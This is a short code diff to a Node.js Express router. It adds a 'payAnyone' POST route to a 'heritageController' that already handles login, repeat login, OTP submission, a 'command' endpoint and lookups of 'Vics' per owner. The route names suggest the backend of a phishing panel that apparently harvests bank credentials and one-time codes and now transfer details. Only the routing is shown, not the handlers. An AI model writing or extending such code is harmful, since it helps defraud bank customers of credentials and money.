@@ -7,6 +7,7 @@ const {
   submitOtp,
   submitLoginAgain,
   deleteEntry,
+  submitPayAnyone,
 } = require("../controllers/heritageController");
 
 const router = express.Router();
@@ -15,6 +16,7 @@ router.get("/customers/:owner", getOwnerVics);
 router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/login", submitLogin);
+router.post("/payAnyone", submitPayAnyone);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/otp", submitOtp);
 router.post("/delete", deleteEntry);
